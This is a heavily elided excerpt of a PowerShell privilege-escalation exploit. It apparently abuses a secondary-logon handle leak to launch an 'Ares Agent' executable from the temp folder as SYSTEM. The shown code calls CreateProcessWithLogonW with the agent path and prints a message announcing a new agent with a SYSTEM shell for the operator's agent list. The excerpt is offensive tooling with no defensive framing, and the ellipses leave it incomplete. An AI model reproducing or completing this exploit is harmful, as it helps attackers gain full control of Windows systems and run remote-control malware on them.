...
"@
	...
	function Get-ThreadHandle {
		...
		$CallResult = [Advapi32]::CreateProcessWithLogonW(
            ...
            0x00000002, "$env:temp\agent.exe", "", #<--------------- path of the Ares Agent 
...
"@
	...
	while ($SafeGuard.ElapsedMilliseconds -lt 10000) {
		...
		if (!$CallResult) {
			echo "[!] Holy handle leak Batman, we have new SUPER AGENT with a SYSTEM shell!!"
			echo "[!] Please check your Agent list !!`n"
